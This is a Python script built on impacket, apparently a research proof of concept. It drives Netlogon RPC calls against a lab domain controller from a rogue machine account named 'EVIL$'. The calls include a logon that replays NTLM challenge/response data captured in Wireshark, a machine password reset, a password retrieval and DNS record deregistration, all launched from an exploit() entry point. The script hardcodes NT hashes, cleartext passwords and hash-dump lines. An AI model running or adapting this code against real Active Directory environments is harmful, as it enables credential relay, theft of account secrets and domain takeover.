from binascii import unhexlify
from struct import unpack

from impacket.dcerpc.v5 import nrpc
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_NETLOGON, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.dcerpc.v5.dtypes import NULL
from impacket import ntlm
from impacket.uuid import bin_to_uuidtup
from impacket.dcerpc.v5 import transport, epm
from Cryptodome.Cipher import ARC4

class DCERPC:
    
    STRING_BINDING_FORMATTING = 1
    STRING_BINDING_MAPPER = 2

    TRANSFER_SYNTAX_NDR = ("8a885d04-1ceb-11c9-9fe8-08002b104860", "2.0")
    TRANSFER_SYNTAX_NDR64 = ("71710533-BEBA-4937-8319-B5DBEF9CCC36", "1.0")

    timeout = None
    authn = False
    authn_level = None
    authn_type = None
    iface_uuid = None
    protocol = None
    string_binding = None
    string_binding_formatting = STRING_BINDING_FORMATTING
    transfer_syntax = TRANSFER_SYNTAX_NDR64
    machine_account = False
    
    username = None
    domain = None
    serverName = None
    password = None
    machine = None
    hashes = None
    machine_netbios = None
    machine_user = None
    machine_user_hashes = None
    aes_key_128 = None
    aes_key_256 = None

    evil_machine_netbios = None
    evil_machine_user = None
    target_user_username = None
    target_user_password = None
    target_user_hashes = None

    def set_transport_config(self, machine_account=False, aes_keys=False):
        """Set configuration parameters in the unit test.
        """

        if len(self.hashes):
            self.lmhash, self.nthash = self.hashes.split(':')
            self.blmhash = unhexlify(self.lmhash)
            self.bnthash = unhexlify(self.nthash)
        else:
            self.lmhash = self.blmhash = ''
            self.nthash = self.bnthash = ''

        if (self.target_user_hashes and len(self.target_user_hashes)):
            self.target_user_lmhash, self.target_user_nthash = self.target_user_hashes.split(':')
            self.target_user_blmhash = unhexlify(self.target_user_lmhash)
            self.target_user_bnthash = unhexlify(self.target_user_nthash)
        else:
            self.target_user_lmhash = self.target_user_blmhash = ''
            self.target_user_nthash = self.target_user_bnthash = ''

        if machine_account:
            if len(self.machine_user_hashes):
                self.machine_user_lmhash, self.machine_user_nthash = self.machine_user_hashes.split(':')
                self.machine_user_blmhash = unhexlify(self.machine_user_lmhash)
                self.machine_user_bnthash = unhexlify(self.machine_user_nthash)
            else:
                self.machine_user_lmhash = self.machine_user_blmhash = ''
                self.machine_user_nthash = self.machine_user_bnthash = ''


    def connect(self, string_binding=None, iface_uuid=None):
        """Obtains a RPC Transport and a DCE interface according to the bindings and
        transfer syntax specified.

        :return: tuple of DCE/RPC and RPC Transport selfects
        :rtype: (DCERPC_v5, DCERPCTransport)
        """
        string_binding = string_binding or self.string_binding
        if not string_binding:
            raise NotImplemented("String binding must be defined")

        rpc_transport = transport.DCERPCTransportFactory(string_binding)

        # Set timeout if defined
        if self.timeout:
            rpc_transport.set_connect_timeout(self.timeout)

        # Authenticate if specified
        if self.authn and hasattr(rpc_transport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpc_transport.set_credentials(self.username, self.password, self.domain, self.lmhash, self.nthash)

        # Gets the DCE RPC selfect
        dce = rpc_transport.get_dce_rpc()

        # Set the authentication level
        if self.authn_level:
            dce.set_auth_level(self.authn_level)

        # Connect
        dce.connect()

        # Bind if specified
        iface_uuid = iface_uuid or self.iface_uuid
        if iface_uuid and self.transfer_syntax:
            dce.bind(iface_uuid, transfer_syntax=self.transfer_syntax)
        elif iface_uuid:
            dce.bind(iface_uuid)

        return dce, rpc_transport
    
    def setUp(self):
        #super(DCERPC, self).setUp()
        self.set_transport_config(machine_account=self.machine_account)

        if self.string_binding_formatting == self.STRING_BINDING_FORMATTING:
            self.string_binding = self.string_binding.format(self)
        elif self.string_binding_formatting == self.STRING_BINDING_MAPPER:
            self.string_binding = epm.hept_map(self.machine, self.iface_uuid, protocol=self.protocol)
    
class NRPC(DCERPC):
    iface_uuid = nrpc.MSRPC_UUID_NRPC
    authn = True
    machine_account = True

    def authenticate(self, dce):
        resp = nrpc.hNetrServerReqChallenge(dce, self.serverName, self.machine_netbios, b'12345678')
        resp.dump()
        serverChallenge = resp['ServerChallenge']

        bnthash = self.machine_user_bnthash or None
        self.sessionKey = nrpc.ComputeSessionKeyStrongKey('', b'12345678', serverChallenge, bnthash)
        
        # set session key
        dce.set_session_key(self.sessionKey)

        self.clientStoredCredential = nrpc.ComputeNetlogonCredential(b'12345678', self.sessionKey)

        try:
            resp = nrpc.hNetrServerAuthenticate3(dce, self.serverName, self.machine_user + '\x00',
                                                 nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel,
                                                 self.machine_netbios, self.clientStoredCredential, 0x600FFFFF)
            resp.dump()
        except nrpc.DCERPCSessionError as e:
            if str(e).find("STATUS_DOWNGRADE_DETECTED") < 0:
                raise

        # need to upgrade auth type
        dce.set_auth_type(self.authn_type)
        dce.set_auth_level(self.authn_level)
        resp = dce.bind(self.iface_uuid, alter=1, transfer_syntax=self.transfer_syntax)

    def update_authenticator(self):
        return nrpc.ComputeNetlogonAuthenticator(self.clientStoredCredential, self.sessionKey)
    
    def test_NetrLogonSamLogonWithFlags(self):
        dce, rpctransport = self.connect()
        self.authenticate(dce)
        request = nrpc.NetrLogonSamLogonWithFlags()
        request['LogonServer'] = self.serverName + '\x00'
        request['ComputerName'] = self.machine_netbios + '\x00'
        
        #request['LogonLevel'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonInteractiveInformation
        request['LogonLevel'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
        
        #request['LogonInformation']['tag'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonInteractiveInformation
        request['LogonInformation']['tag'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
        
        #request['LogonInformation']['LogonInteractive']['Identity']['LogonDomainName'] = self.domain
        #request['LogonInformation']['LogonInteractive']['Identity']['ParameterControl'] = 2 + 2 ** 14 + 2 ** 7 + 2 ** 9 + 2 ** 5 + 2 ** 11
        #request['LogonInformation']['LogonInteractive']['Identity']['UserName'] = self.username
        #request['LogonInformation']['LogonInteractive']['Identity']['Workstation'] = ''

        request['LogonInformation']['LogonNetworkTransitive']['Identity']['LogonDomainName'] = self.domain
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['ParameterControl'] = unpack('<L', b'\xe0\x2a\x00\x00')[0]
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['UserName'] = self.target_user_username
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['Workstation'] = ''
        
        # from wireshark to EVIL
        challenge = unhexlify("1c5bfa63a09b3c5b")
        ansLM = unhexlify("28251cf8c236efd8a1ccaa7f5bf60d68313947314d586b6c")
        ansNT = unhexlify("11dc095f81ab4e8b296ff354f9ef0d7c010100000000000080d7d4c7ab77dc01313947314d586b6c00000000020006004c0041004200010008004500560049004c0004001c004500560049004c002e004c00410042002e004c004f00430041004c00030012004c00410042002e004c004f00430041004c00050012004c00410042002e004c004f00430041004c000700080080d7d4c7ab77dc0109001c0063006900660073002f004c00410042002e004c004f00430041004c0000000000")

        #challenge = unhexlify("f5a044ed4f0ee9b7")
        #ansLM = unhexlify("d0bc534f39e0280850c921c5b830158e53366a3944485469")
        #ansNT = unhexlify("f8e53af75bbb6a659d7648691357c4800101000000000000ff6a8a41a577dc0153366a394448546900000000020006004c004100420001001e00570049004e002d004b0049004d004d0043004a0053005500360030003900040012004c00410042002e004c004f00430041004c0003003200570049004e002d004b0049004d004d0043004a00530055003600300039002e004c00410042002e004c004f00430041004c00050012004c00410042002e004c004f00430041004c0007000800ff6a8a41a577dc0109003c0063006900660073002f00570049004e002d004b0049004d004d0043004a00530055003600300039002e004c00410042002e004c004f00430041004c0000000000")

        #challenge = unhexlify("ee971b339268beef")
        #ansLM = unhexlify("efdfbe50d0e4789c7cb857016e5d6aba46ab3eb90074d1df")
        #ansNT = unhexlify("bb2e5a6d9b06e27013a7e97ac98f9aaf01010000000000003875b0ba2c79dc0109d3ad1943c4f54800000000020006004c004100420001001e00570049004e002d004b0049004d004d0043004a0053005500360030003900040012004c00410042002e004c004f00430041004c0003003200570049004e002d004b0049004d004d0043004a00530055003600300039002e004c00410042002e004c004f00430041004c00050012004c00410042002e004c004f00430041004c00070008003875b0ba2c79dc0103001c004500560049004c002e004c00410042002e004c004f00430041004c00060004000200000008003000300000000000000000000000004000009b80772aa87062541c87b994243a485336b25975fee217785bbdd9b0e21a69620a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310033002e00330037002e003100300031000000000000000000")

        request['LogonInformation']['LogonNetworkTransitive']['LmChallenge'] = challenge
        request['LogonInformation']['LogonNetworkTransitive']['NtChallengeResponse'] = ansNT
        request['LogonInformation']['LogonNetworkTransitive']['LmChallengeResponse'] = ansLM
        
        if len(self.hashes):
            blmhash = self.blmhash
            bnthash = self.bnthash
        else:
            blmhash = ntlm.LMOWFv1(self.password)
            bnthash = ntlm.NTOWFv1(self.password)

        try:
            from Cryptodome.Cipher import ARC4
        except Exception:
            print("Warning: You don't have any crypto installed. You need pycryptodomex")
            print("See https://pypi.org/project/pycryptodomex/")

        rc4 = ARC4.new(self.sessionKey)
        blmhash = rc4.encrypt(blmhash)
        rc4 = ARC4.new(self.sessionKey)
        bnthash = rc4.encrypt(bnthash)

        #request['LogonInformation']['LogonInteractive']['LmOwfPassword'] = blmhash
        #request['LogonInformation']['LogonInteractive']['NtOwfPassword'] = bnthash
        request['ValidationLevel'] = nrpc.NETLOGON_VALIDATION_INFO_CLASS.NetlogonValidationSamInfo4
        request['Authenticator'] = self.update_authenticator()
        request['ReturnAuthenticator']['Credential'] = b'\x00' * 8
        request['ReturnAuthenticator']['Timestamp'] = 0
        request['ExtraFlags'] = 0

        try:
            resp = dce.request(request)
            resp.dump()
        except DCERPCException as e:
            if str(e).find('STATUS_NO_SUCH_USER') < 0:
                raise

    def test_hNetrServerPasswordSet2(self):
        # It doesn't do much, should throw STATUS_ACCESS_DENIED
        dce, rpctransport = self.connect()
        self.authenticate(dce)
        cnp = nrpc.NL_TRUST_PASSWORD()

        cnp['Buffer'] = b'\x00'*512
        cnp['Length'] = 0x8

        try:
            resp = nrpc.hNetrServerPasswordSet2(dce, self.serverName, self.machine_user,
                                         nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel,
                                         self.machine_netbios, self.update_authenticator(), cnp.getData())
            resp.dump()
        except DCERPCException as e:
            # The caller is not a DC or PDC
            if str(e).find('STATUS_ACCESS_DENIED') < 0:
                raise
            raise
        except Exception as e:
            raise

    def test_NetrServerPasswordGet(self):
        dce, rpctransport = self.connect()
        self.authenticate(dce)
        request = nrpc.NetrServerPasswordGet()
        request['PrimaryName'] = self.serverName + '\x00'
        request['AccountName'] = self.machine_user + '\x00'
        request['AccountType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel
        request['ComputerName'] = self.machine_user + '\x00'
        request['Authenticator'] = self.update_authenticator()

        
        resp = dce.request(request)
        resp.dump()

    def test_DsrDeregisterDnsHostRecords(self):
        dce, rpctransport = self.connect()
        self.authenticate(dce)
        request = nrpc.DSRUpdateReadOnlyServerDnsRecords()
        request['ServerName'] = self.serverName + '\x00'
        request['ComputerName'] = self.machine_user + '\x00'
        request['Authenticator'] = self.update_authenticator()
        request['SiteName'] = NULL
        request['DnsTtl'] = 0x100


        request['DnsDomainName'] = 'BETUS\x00'
        request['DomainGuid'] = NULL
        request['DsaGuid'] = NULL
        request['DnsHostName'] = 'BETUS\x00'

        resp = dce.request(request)
        resp.dump()

class NRPCSMBTransport(NRPC):
    string_binding = r"ncacn_np:{0.machine}[\PIPE\netlogon]"
    string_binding_formatting = DCERPC.STRING_BINDING_FORMATTING

class NRPCTCPTransport(NRPC):
    protocol = "ncacn_ip_tcp"
    string_binding_formatting = DCERPC.STRING_BINDING_MAPPER

def exploit(client):
    
    #client.test_NetrLogonSamLogonWithFlags()
    client.test_hNetrServerPasswordSet2()
    #client.test_NetrServerPasswordGet()

if __name__ == "__main__":
    client = NRPCSMBTransport()

    client.domain = "LAB.LOCAL"
    client.username = "test"
    client.password = "Azerty1234!"
    client.hashes = "aad3b435b51404eeaad3b435b51404ee:6d817d0d58c8cbc298b0edb8448f46d8"

    client.username = "EVIL$"
    client.password = None #"K4zcFcXJ7nhG6XDGIqnTm9vKV8rzBMlI"
    client.hashes = "aad3b435b51404eeaad3b435b51404ee:fbe53598188c75f9a1f601b827d39c4a"

    #WIN-KIMMCJSU609$:1000:aad3b435b51404eeaad3b435b51404ee:acf1f6e85ddfd519e7d1a2979aba459a:::
    #EVIL$:1111:aad3b435b51404eeaad3b435b51404ee:fbe53598188c75f9a1f601b827d39c4a:::K4zcFcXJ7nhG6XDGIqnTm9vKV8rzBMlI
    #EVIL2$:1112:aad3b435b51404eeaad3b435b51404ee:006306ff2857d98e64545767ff374e51:::AkZS33vV8eiriahyDOGgttHTwjemNrxV


    client.serverName = "WIN-KIMMCJSU609"
    client.machine = "10.13.37.102"

    client.machine_netbios = "EVIL"
    client.machine_user = client.machine_netbios + "$"
    client.machine_user_hashes = "aad3b435b51404eeaad3b435b51404ee:fbe53598188c75f9a1f601b827d39c4a"
    
    client.target_user_username = "test"
    #client.target_user_password = "Azerty1234!"
    #client.target_user_hashes = "aad3b435b51404eeaad3b435b51404ee:6d817d0d58c8cbc298b0edb8448f46d8"

    client.evil_machine_netbios = "RANDOM-EVIL-SERVER"
    client.evil_machine_user = client.evil_machine_netbios + "$"

    client.authn_level = RPC_C_AUTHN_LEVEL_PKT_PRIVACY
    client.authn_type = RPC_C_AUTHN_NETLOGON
    client.setUp()

    exploit(client)